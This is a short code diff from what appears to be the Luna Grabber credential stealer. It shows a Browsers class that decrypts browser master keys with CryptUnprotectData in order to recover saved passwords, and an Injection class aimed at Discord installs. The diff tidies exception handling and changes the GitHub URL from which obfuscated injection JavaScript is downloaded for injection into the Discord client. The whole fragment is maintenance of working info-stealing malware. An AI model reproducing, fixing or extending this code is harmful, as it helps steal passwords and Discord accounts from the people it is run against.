@@ -568,7 +568,7 @@ class Browsers:
         def process_browser(name, path, profile, func):
             try:
                 func(name, path, profile)
-            except:
+            except Exception:
                 pass
 
         threads = []
@@ -604,7 +604,7 @@ class Browsers:
             master_key = master_key[5:]
             master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
             return master_key
-        except:
+        except Exception:
             pass
 
     def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
@@ -867,7 +867,7 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        response = requests.get('https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js')
+        response = requests.get('https://raw.githubusercontent.com/Smug246/Luna-Grabber-Injection/main/injection-obfuscated.js')
         if response.status_code != 200:
             return
         self.code = response.text
